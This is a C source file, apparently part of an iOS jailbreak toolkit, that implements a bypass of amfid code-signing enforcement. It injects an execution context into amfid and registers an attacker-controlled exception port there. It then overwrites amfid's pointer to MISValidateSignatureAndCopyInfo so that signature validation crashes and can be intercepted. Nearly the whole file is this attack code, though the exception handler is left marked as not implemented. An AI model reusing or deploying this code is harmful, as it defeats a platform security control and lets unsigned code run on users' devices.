/*
 * Amfid codesigning bypass
 * ------------------------
 *
 *  In order to load and run unsigned code, we patch amfid to allow us to intercept the kernel's
 *  callout to amfid's verify_code_directory service routine. This code is heavily based on the
 *  implementation in Ian Beer's triple_fetch project:
 *  https://bugs.chromium.org/p/project-zero/issues/detail?id=1247
 *
 */
#include "amfid_codesign_bypass.h"

#include "headers/mach_vm.h"
#include "log/log.h"
#include "sandbox_escape/exception_server.h"
#include "sandbox_escape/threadexec_routines.h"

#include <assert.h>
#include <dispatch/dispatch.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdlib.h>

// The path to the amfid binary.
static const char *AMFID_PATH = "/usr/libexec/amfid";

// The address of crash messages.
static const uintptr_t AMFID_CRASH_ADDRESS = 0x626c616e6b6574;

// The execution context in amfid.
static threadexec_t amfid_tx;

// The Mach port on which we will receive exception messages from amfid.
static mach_port_t amfid_exception_port;

// Create a threadexec execution context inside amfid.
static threadexec_t
create_amfid_threadexec(threadexec_t priv_tx) {
	pid_t amfid_pid;
	size_t pid_count = 1;
	bool ok = threadexec_pids_for_path(priv_tx, AMFID_PATH, &amfid_pid, &pid_count);
	if (!ok || pid_count == 0) {
		ERROR("Could not find amfid PID");
		return NULL;
	} else if (pid_count > 1) {
		ERROR("Multiple amfid PIDs");
		return NULL;
	}
	threadexec_t amfid_tx = threadexec_init_with_threadexec_and_pid(priv_tx, amfid_pid);
	if (amfid_tx == NULL) {
		ERROR("Could not create execution context in amfid");
		return NULL;
	}
	return amfid_tx;
}

// Catch and handle an exception message from amfid.
static kern_return_t
amfid_catch_exception(mach_port_t thread, mach_port_t task, exception_type_t exception) {
	INFO("Received exception from amfid");
	// We've received an exception message from amfid. Get the thread state.
	arm_thread_state64_t state;
	mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
	kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64,
			(thread_state_t) &state, &count);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not get thread state of thread 0x%x", thread);
		return KERN_FAILURE;
	}
	WARNING("NOT IMPLEMENTED"); // TODO
	DEBUG_TRACE(1, "Amfid crashing PC: 0x%016llx", state.__pc);
	return KERN_FAILURE;
}

// Repeatedly listen for and handle exception messages from amfid.
static void *
amfid_exception_handler_thread(void *arg) {
	// Loop forever catching exceptions from amfid.
	catch_exception_server(amfid_exception_port, 0, ^bool (
			mach_port_t            thread,
			mach_port_t            task,
			exception_type_t       exception,
			exception_data_t       code,
			mach_msg_type_number_t codeCnt,
			kern_return_t *        result) {
		kern_return_t kr = amfid_catch_exception(thread, task, exception);
		*result = kr;
		if (kr != KERN_SUCCESS) {
			WARNING("Cannot handle exception: amfid will crash");
		}
		return false;
	});
	DEBUG_TRACE(1, "Exiting amfid exception handler thread");
	return NULL;
}

// Set up the exception handler for amfid.
static bool
setup_amfid_exception_handler() {
	// Create a receive right (and send right) on which we will listen for amfid's exception
	// message.
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0,
			&amfid_exception_port);
	assert(kr == KERN_SUCCESS);
	// According to a comment from Ian Beer's triple_fetch in the file nsxpc2pc/patch_amfid.c,
	// we can't set amfid's task-level exception handler directly (or, presumably, via
	// ReportCrash), we need to make amfid set it itself. Thus, we will copy our new exception
	// port over to amfid and make it set that port as the exception handler itself.
	bool ok = threadexec_task_set_exception_ports(
			amfid_tx,
			threadexec_task(amfid_tx),
			EXC_MASK_ALL,
			amfid_exception_port,
			EXCEPTION_DEFAULT,
			ARM_THREAD_STATE64);
	if (!ok) {
		ERROR("Could not register exception handler for amfid");
		// The port will be destroyed by amfid_codesign_bypass_remove().
		return false;
	}
	INFO("Registered exception handler for amfid");
	// Now create a dedicated thread to monitor exception messages from amfid.
	pthread_t amfid_thread;
	pthread_create(&amfid_thread, NULL, amfid_exception_handler_thread, NULL);
	pthread_detach(amfid_thread);
	return true;
}

// Get the address of the MISValidateSignatureAndCopyInfo function. This will be the same across
// processes since it is in the dyld shared cache.
static const void *
find_MISValidateSignatureAndCopyInfo() {
	void *libmis = dlopen("libmis.dylib", RTLD_LAZY);
	if (libmis == NULL) {
		WARNING("Could not find %s", "libmis.dylib");
		libmis = RTLD_DEFAULT;
	}
	void *MISValidateSignatureAndCopyInfo = dlsym(libmis, "MISValidateSignatureAndCopyInfo");
	if (MISValidateSignatureAndCopyInfo == NULL) {
		ERROR("Could not find %s", "MISValidateSignatureAndCopyInfo");
		goto fail;
	}
	DEBUG_TRACE(2, "%s = 0x%llx", "MISValidateSignatureAndCopyInfo",
			MISValidateSignatureAndCopyInfo);
fail:
	if (libmis != RTLD_DEFAULT) {
		dlclose(libmis);
	}
	return MISValidateSignatureAndCopyInfo;
}

// Find the address at which a binary is loaded in memory. I'd like to use something more robust
// than this.
static bool
find_binary_load_address(threadexec_t process_tx, const void **header, size_t *region_size) {
	// Call mach_vm_region() to get the first mapped address in the task.
	mach_vm_address_t address = 0;
	mach_vm_size_t size;
	struct vm_region_basic_info_64 info;
	mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
	mach_port_t object_r;
	kern_return_t kr;
	bool ok = threadexec_call_cv(process_tx, &kr, sizeof(kr),
			mach_vm_region, 7,
			TX_CARG_LITERAL(vm_map_t, threadexec_task_remote(process_tx)),
			TX_CARG_PTR_LITERAL_INOUT(mach_vm_address_t *, &address),
			TX_CARG_PTR_LITERAL_OUT(mach_vm_size_t *, &size),
			TX_CARG_LITERAL(vm_region_flavor_t, VM_REGION_BASIC_INFO_64),
			TX_CARG_PTR_DATA_OUT(vm_region_info_t, &info, sizeof(info)),
			TX_CARG_PTR_LITERAL_INOUT(mach_msg_type_number_t *, &count),
			TX_CARG_PTR_LITERAL_OUT(mach_port_t *, &object_r));
	if (!ok || kr != KERN_SUCCESS) {
		ERROR("Could not get load address of task 0x%x", threadexec_task(process_tx));
		return false;
	}
	*header = (const void *)address;
	*region_size = size;
	return true;
}

// Patch amfid so that it crashes in verify_code_directory() at MISValidateSignatureAndCopyInfo().
static bool
patch_amfid_validation_to_crash() {
	bool success = false;
	// Get the address of the MISValidateSignatureAndCopyInfo function.
	const void *MISValidateSignatureAndCopyInfo = find_MISValidateSignatureAndCopyInfo();
	if (MISValidateSignatureAndCopyInfo == NULL) {
		goto fail_0;
	}
	// Find the address of amfid's Mach-O header.
	const void *amfid_header_r;
	size_t amfid_header_size;
	bool ok = find_binary_load_address(amfid_tx, &amfid_header_r, &amfid_header_size);
	if (amfid_header_r == NULL) {
		goto fail_0;
	}
	DEBUG_TRACE(2, "amfid load address: %p, size: %zu", amfid_header_r, amfid_header_size);
	// Copy the header of the amfid binary into a local buffer.
	amfid_header_size = 0x8000; // TODO
	void *amfid_header = malloc(amfid_header_size);
	assert(amfid_header != NULL);
	ok = threadexec_read(amfid_tx, amfid_header_r, amfid_header, amfid_header_size);
	if (!ok) {
		ERROR("Could not read amfid binary header");
		goto fail_1;
	}
	// Search for the MISValidateSignatureAndCopyInfo pointer in the header. This will be in
	// the __la_symbol_ptr segment, which is used by the stubs to jump to the true
	// implementation in the dyld shared cache.
	const void *found = memmem(amfid_header, amfid_header_size,
			&MISValidateSignatureAndCopyInfo, sizeof(MISValidateSignatureAndCopyInfo));
	if (found == NULL) {
		ERROR("Could not find pointer to %s in amfid", "MISValidateSignatureAndCopyInfo");
		goto fail_1;
	}
	size_t offset_MISValidateSignatureAndCopyInfo = (uintptr_t)found - (uintptr_t)amfid_header;
	const void *amfid_ptr_MISValidateSignatureAndCopyInfo =
		(const void *)((uintptr_t)amfid_header_r + offset_MISValidateSignatureAndCopyInfo);
	DEBUG_TRACE(2, "Amfid's MISValidateSignatureAndCopyInfo found at address %p",
			amfid_ptr_MISValidateSignatureAndCopyInfo);
	// Now overwrite the MISValidateSignatureAndCopyInfo pointer with a bogus address to
	// trigger a crash.
	ok = threadexec_write(amfid_tx, amfid_ptr_MISValidateSignatureAndCopyInfo,
			&AMFID_CRASH_ADDRESS, sizeof(AMFID_CRASH_ADDRESS));
	if (!ok) {
		ERROR("Could not overwrite %s pointer in amfid",
				"MISValidateSignatureAndCopyInfo");
		goto fail_1;
	}
	DEBUG_TRACE(2, "Overwrote pointer to %s in amfid", "MISValidateSignatureAndCopyInfo");
	success = true;
fail_1:
	free(amfid_header);
fail_0:
	return success;
}

bool
amfid_codesign_bypass_install(threadexec_t priv_tx) {
	amfid_tx = create_amfid_threadexec(priv_tx);
	if (amfid_tx == NULL) {
		goto fail_0;
	}
	bool ok = setup_amfid_exception_handler();
	if (!ok) {
		goto fail_1;
	}
	ok = patch_amfid_validation_to_crash();
	if (!ok) {
		goto fail_1;
	}
	return true;
fail_1:
	amfid_codesign_bypass_remove();
fail_0:
	return false;
}

void
amfid_codesign_bypass_remove() {
	if (amfid_exception_port != MACH_PORT_NULL) {
		// Ideally we should unregister amfid's exception handler on failure, but I think
		// just destroying the port should do the trick.
		mach_port_destroy(mach_task_self(), amfid_exception_port);
		amfid_exception_port = MACH_PORT_NULL;
	}
	if (amfid_tx != NULL) {
		threadexec_deinit(amfid_tx);
		amfid_tx = NULL;
	}
}
